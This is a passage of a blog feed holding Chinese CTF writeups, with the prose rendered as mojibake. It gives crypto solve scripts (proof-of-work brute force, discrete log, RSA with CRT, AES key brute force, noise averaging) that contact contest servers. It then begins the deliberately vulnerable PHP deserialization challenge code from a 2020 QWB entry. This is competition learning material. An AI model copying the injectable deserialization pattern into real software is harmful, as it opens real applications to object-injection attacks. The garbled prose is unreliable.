class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;124.71.158.89&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;str + &quot;</span>)</span><br><span class="line">    data = r.recv(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;== &quot;</span>)</span><br><span class="line">    <span class="built_in">hash</span> = r.recv(<span class="number">5</span>)</span><br><span class="line">    ans = util.iters.bruteforce(<span class="keyword">lambda</span> x: md5(x + data).hexdigest()[:<span class="number">5</span>] == <span class="built_in">hash</span>, string.ascii_letters + string.digits,</span><br><span class="line">                                length=<span class="number">4</span>, )</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;xxxxx:&quot;</span>, ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proof()</span><br><span class="line"></span><br><span class="line">a = <span class="number">48</span></span><br><span class="line">s0, t0 = <span class="number">7</span>, <span class="number">1</span></span><br><span class="line">s1, t1 = s0, t0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    s = s1 * s0 + a * t1 * t0</span><br><span class="line">    t = t1 * s0 + t0 * s1</span><br><span class="line">    s1 = s</span><br><span class="line">    t1 = t</span><br><span class="line">    <span class="keyword">if</span> (s - <span class="number">3</span>) % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">        y = (s - <span class="number">3</span>) / <span class="number">4</span></span><br><span class="line">        x, flag = gmpy2.iroot(((y + <span class="number">1</span>) * (<span class="number">2</span> * y + <span class="number">1</span>)) / <span class="number">6</span>, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">assert</span> flag == <span class="literal">True</span></span><br><span class="line">        r.sendlineafter(<span class="string">&quot;[&gt;] x: &quot;</span>, <span class="built_in">str</span>(x))</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;[&gt;] y: &quot;</span>, <span class="built_in">str</span>(y))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="babycrypto"><a href="#babycrypto" class="headerlink" title="babycrypto"></a>babycrypto</h3><p>å‚è€ƒ<a href="https://keltecc.github.io/ctf/writeup/2020/05/24/m0lecon-ctf-2020-teaser-king-exchange.html">https://keltecc.github.io/ctf/writeup/2020/05/24/m0lecon-ctf-2020-teaser-king-exchange.html</a>ï¼ŒåŸºæœ¬åŸé¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_points</span>(<span class="params">P, Q</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((P[<span class="number">0</span>]*Q[<span class="number">0</span>]-P[<span class="number">1</span>]*Q[<span class="number">1</span>]) % p, (P[<span class="number">0</span>]*Q[<span class="number">1</span>]+P[<span class="number">1</span>]*Q[<span class="number">0</span>]) % p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multiply</span>(<span class="params">P, n</span>):</span></span><br><span class="line">    Q = (<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            Q = add_points(Q, P)</span><br><span class="line">        P = add_points(P, P)</span><br><span class="line">        n = n//<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line">A = (<span class="number">68279847973010227567437241690876400434176575735647388141445319082120661</span>, <span class="number">36521392659318312718307506287199839545959127964141955928297920414981390</span>)</span><br><span class="line">B = (<span class="number">84698630137710906531637499064120297563999383201108850561060383338482806</span>, <span class="number">10975400339031190591877824767290004140780471215800442883565278903964109</span>)</span><br><span class="line">g = (<span class="number">29223879291878505213325643878338189297997503744039619988987863719655098</span>, <span class="number">32188620669315455017576071518169599806490004123869726364682284676721556</span>)</span><br><span class="line">p = gcd(A[<span class="number">0</span>]^<span class="number">2</span> + A[<span class="number">1</span>]^<span class="number">2</span> - <span class="number">1</span>, B[<span class="number">0</span>]^<span class="number">2</span> + B[<span class="number">1</span>]^<span class="number">2</span> - <span class="number">1</span>)</span><br><span class="line">p = p / <span class="number">4</span></span><br><span class="line">F = GF(p)</span><br><span class="line">R.&lt;w&gt; = PolynomialRing(F)</span><br><span class="line">K.&lt;w&gt; = F.extension(w^<span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">g_K = g[<span class="number">0</span>] + g[<span class="number">1</span>]*w</span><br><span class="line">B_K = B[<span class="number">0</span>] + B[<span class="number">1</span>]*w</span><br><span class="line">b = discrete_log(B_K, g_K)</span><br><span class="line"></span><br><span class="line">print(multiply(g, b) == B)</span><br><span class="line"></span><br><span class="line">shared = multiply(A, b)[<span class="number">0</span>]</span><br><span class="line">key = sha256(long_to_bytes(shared)).digest()</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">cipher = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;26b1b05962d188f1f2abdfad2cef049d45cfc27d9e46f40ebe52e367941bcfa05dd0ef698f528375be2185759e663431&#x27;</span>)</span><br><span class="line">print(aes.decrypt(cipher))</span><br></pre></td></tr></table></figure><h3 id="da-Vinci-after-rsa"><a href="#da-Vinci-after-rsa" class="headerlink" title="da Vinci after rsa"></a>da Vinci after rsa</h3><p>å…ˆæ˜¯ä¸ªrsaï¼Œç„¶åæ˜¯è¾¾èŠ¬å¥‡å¯†ç ã€‚</p><p>rsa å‘ç°nå¯ä»¥ç›´æ¥åˆ†è§£ï¼Œæœ‰ä¸‰ä¸ªå› å­ï¼Œä¸¤ä¸ªå› å­çš„æ¬§æ‹‰å€¼éƒ½ä¸ e ä¸äº’ç´ ï¼Œå¹¶ä¸”å› å­æ¯”è¾ƒå°ã€‚</p><p>æƒ³èµ·æ¥ 2016 0CTF ä¸€ä¸ªé¢˜ï¼Œåº”è¯¥æ˜¯å…ˆè¦è§£ä¸‰ä¸ªæ¨¡æ•°æ–¹ç¨‹ï¼Œç„¶åç”¨ CRT æ±‚è§£ã€‚</p><p>16å¹´é‚£ä¸ªé¢˜é¢˜è§£åœ¨è¿™é‡Œï¼š<a href="https://wooyun.js.org/drops/0ctf%20writeup.html">https://wooyun.js.org/drops/0ctf%20writeup.html</a>ã€‚æ±‚ä¸‰ä¸ªæ¨¡æ•°æ–¹ç¨‹å¯ä»¥ç”¨<a href="https://www.wolframalpha.com/åœ¨çº¿æ±‚è§£ã€‚">https://www.wolframalpha.com/åœ¨çº¿æ±‚è§£ã€‚</a></p><p>æ±‚è§£åä½¿ç”¨CRTï¼Œç„¶åå†è¾¾èŠ¬å¥‡å¯†ç è§£å¯†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span>(<span class="params">mi, ai</span>):</span></span><br><span class="line">    <span class="comment"># mi,aiåˆ†åˆ«è¡¨ç¤ºæ¨¡æ•°å’Œå–æ¨¡åçš„å€¼,éƒ½ä¸ºåˆ—è¡¨ç»“æ„</span></span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">isinstance</span>(mi, <span class="built_in">list</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(ai, <span class="built_in">list</span>))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> <span class="built_in">zip</span>(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>)  <span class="comment"># ä¸æˆç«‹åˆ™ä¸å­˜åœ¨è§£</span></span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm)  <span class="comment"># (è§£,æœ€å°å…¬å€æ•°)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0x1d42aea2879f2e44dea5a13ae3465277b06749ce9059fd8b7b4b560cd861f99144d0775ffffffffffff</span></span><br><span class="line">c = <span class="number">421363015174981309103786520626603807427915973516427836319727073378790974986429057810159449046489151</span></span><br><span class="line">p = <span class="number">9749</span></span><br><span class="line">q = <span class="number">11237753507624591</span></span><br><span class="line">r = n / p / q</span><br><span class="line">e = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">p_roots = [<span class="number">7361</span>]</span><br><span class="line">q_roots = [<span class="number">2722510300825886</span>, <span class="number">6139772527803903</span>, <span class="number">6537111956662153</span>, <span class="number">8415400986072042</span>, <span class="number">9898464751509789</span>]</span><br><span class="line">r_roots = [<span class="number">180966415225632465120208272366108475667934082405238808958048294287011243645</span>,</span><br><span class="line">           <span class="number">2816114411493328258682873357893989007684496552202823306045771363205185148674391</span>,</span><br><span class="line">           <span class="number">1369135259891793292334345751773139388112378132927363770631732500241630990458667</span>,</span><br><span class="line">           <span class="number">5570877862584063114417410584640901580756179707042774516590562822938385811269597</span>,</span><br><span class="line">           <span class="number">8499052407588078002885931765166137308397074232361087682974448633946350539292222</span>]</span><br><span class="line">m_list = []</span><br><span class="line"><span class="keyword">for</span> pp <span class="keyword">in</span> p_roots:</span><br><span class="line">    <span class="keyword">for</span> qq <span class="keyword">in</span> q_roots:</span><br><span class="line">        <span class="keyword">for</span> rr <span class="keyword">in</span> r_roots:</span><br><span class="line">            res = GCRT([p, q, r], [pp, qq, rr])[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">pow</span>(res, e, n) == c:</span><br><span class="line">                <span class="built_in">print</span> long_to_bytes(res)</span><br><span class="line">flag_enc = <span class="string">&quot;weadfa9987_adwd23123_454f&quot;</span></span><br><span class="line">enc = [<span class="number">1</span>, <span class="number">28657</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">17711</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">46368</span>, <span class="number">75025</span>, <span class="number">34</span>, <span class="number">55</span>, <span class="number">89</span>, <span class="number">610</span>, <span class="number">377</span>, <span class="number">144</span>, <span class="number">233</span>, <span class="number">1597</span>, <span class="number">2584</span>, <span class="number">4181</span>, <span class="number">6765</span>,</span><br><span class="line">       <span class="number">10946</span>, <span class="number">987</span>]</span><br><span class="line">a = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">34</span>, <span class="number">55</span>, <span class="number">89</span>, <span class="number">144</span>, <span class="number">233</span>, <span class="number">377</span>, <span class="number">610</span>, <span class="number">987</span>, <span class="number">1597</span>, <span class="number">2584</span>, <span class="number">4181</span>, <span class="number">6765</span>, <span class="number">10946</span>, <span class="number">17711</span>, <span class="number">28657</span>, <span class="number">46368</span>,</span><br><span class="line">     <span class="number">75025</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    flag += flag_enc[a.index(i)]</span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line"><span class="comment"># w5awd4fa994f87_dwad3123_2</span></span><br><span class="line"><span class="comment"># flag&#123;w5aed4fa994f87_dwad3123_2&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ezAES"><a href="#ezAES" class="headerlink" title="ezAES"></a>ezAES</h3><p>å¯†é’¥ä¸¤ä½æœªçŸ¥ï¼Œæ‹¥æœ‰æœ€åä¸€ä¸ªåˆ†ç»„çš„æ˜å¯†æ–‡ï¼Œä»¥åŠå€’æ•°ç¬¬äºŒæ®µå¯†æ–‡çš„å10ä¸ªå­—ç¬¦ï¼Œå¯ä»¥çˆ†ç ´ã€‚</p><p>çˆ†ç ´å‡ºå¯†é’¥åä»åå‘å‰æ±‚å¯†æ–‡å’Œ IV å°±å¥½äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;T0EyZaLRzQmNe2pd&#x27;</span></span><br><span class="line">KEYSIZE = <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">message</span>):</span></span><br><span class="line">    p = (KEYSIZE - <span class="built_in">len</span>(message) % KEYSIZE) * <span class="built_in">chr</span>(KEYSIZE - <span class="built_in">len</span>(message) % KEYSIZE)</span><br><span class="line">    <span class="keyword">return</span> message + p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">h = hashlib.md5(key).hexdigest()</span><br><span class="line">SECRET = binascii.unhexlify(h)[:<span class="number">10</span>]</span><br><span class="line">message = <span class="string">&#x27;AES CBC Mode is commonly used in data encryption. What do you know about it?&#x27;</span> + SECRET</span><br><span class="line">message = pad(message)</span><br><span class="line">data1 = <span class="string">&quot;a32c412a3e7474e584cd72481dab9dd83141706925d92bdd39e4&quot;</span>.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">c = data1[<span class="number">-16</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(message), <span class="number">0</span>, <span class="number">-16</span>):</span><br><span class="line">    c = strxor(AES.new(key).decrypt(c), message[i - <span class="number">16</span>:i])</span><br><span class="line"><span class="built_in">print</span> c</span><br><span class="line"></span><br><span class="line"><span class="comment"># str_list = [chr(i) for i in range(255)]</span></span><br><span class="line"><span class="comment"># for c1 in str_list:</span></span><br><span class="line"><span class="comment">#     for c2 in str_list:</span></span><br><span class="line"><span class="comment">#         key = &quot;T0EyZaLRzQmNe2&quot; + c1 + c2</span></span><br><span class="line"><span class="comment">#         if strxor(AES.new(key).decrypt(data1[-16:]), message[-16:])[-10:] == data1[:-16]:</span></span><br><span class="line"><span class="comment">#             print(c1 + c2)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="what-r-the-noise"><a href="#what-r-the-noise" class="headerlink" title="what_r_the_noise"></a>what_r_the_noise</h3><p>åŸºæœ¬åŸé¢˜ï¼Œå‚è€ƒï¼š<a href="https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Differential-Privacy/">https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Differential-Privacy/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;124.71.145.165&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_list</span>():</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    s = r.recvline()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(<span class="string">&quot;[&quot;</span> + s + <span class="string">&quot;]&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">47</span>):</span><br><span class="line">    d.append(<span class="built_in">list</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line"></span><br><span class="line">    l = get_list()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">        d[j].append(l[j])</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">47</span>):</span><br><span class="line">    av = <span class="built_in">sum</span>(d[i]) / <span class="built_in">len</span>(d[i])</span><br><span class="line">    result.append(<span class="built_in">int</span>(<span class="built_in">round</span>(av)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> result</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> result])</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF.wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 å¼ºç½‘æ¯ writeup</title>
      <link href="/2020/08/28/2020-qwb/"/>
      <url>/2020/08/28/2020-qwb/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å®Œå¼ºç½‘æ¯å°±å»å­¦æ ¡æŠ¥é“äº†ï¼ŒæŠ½ç©ºè¡¥ä¸€ä¸‹wpã€‚</p><h3 id="å¼ºç½‘å…ˆé”‹-è¾…åŠ©"><a href="#å¼ºç½‘å…ˆé”‹-è¾…åŠ©" class="headerlink" title="å¼ºç½‘å…ˆé”‹-è¾…åŠ©"></a>å¼ºç½‘å…ˆé”‹-è¾…åŠ©</h3><p>ååºåˆ—åŒ–é€ƒé€¸ï¼Œå‚è€ƒ<a href="https://m0nit0r.top/2020/02/05/object-injection-caused-by-PHP-string-escape/#Joomlaé€ƒé€¸">https://m0nit0r.top/2020/02/05/object-injection-caused-by-PHP-string-escape/#Joomla%E9%80%83%E9%80%B8</a>å†åŠ ä¸Šç»•è¿‡wakeupï¼Œä»¥åŠååºåˆ—åŒ–ä¸­ä½¿ç”¨å¤§å†™Så¯ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºçš„ä¸€äº›ç»•è¿‡æ–¹å¼ã€‚</p><p>éœ€è¦æ³¨æ„è°ƒè¯•çš„æ—¶å€™æœ€å¥½urlç¼–ç ï¼Œç›´æ¥echo \0 æ— æ³•æ˜¾ç¤ºï¼Œç®—è¦†ç›–é•¿åº¦çš„æ—¶å€™å®¹æ˜“å‡ºé”™ã€‚</p><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> $user;</span><br><span class="line">   <span class="keyword">protected</span> $pass;</span><br><span class="line">   <span class="keyword">protected</span> $admin;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$user, $pass, $admin = <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;pass = $pass;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;admin = $admin;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> $name;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name = <span class="string">&#x27;Riven&#x27;</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">TP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">&quot;function&quot;</span> <span class="keyword">or</span> gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">&quot;object&quot;</span>)&#123;</span><br><span class="line">           $name = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">           $name();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;TP();</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> $name;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name !== <span class="string">&#x27;Yasuo&#x27;</span>)&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;name = <span class="string">&#x27;Yasuo&#x27;</span>;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;No Yasuo! No Soul!\n&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;Gank();</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Gank</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;name, <span class="string">&#x27;Yasuo&#x27;</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;Are you orphan?\n&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span 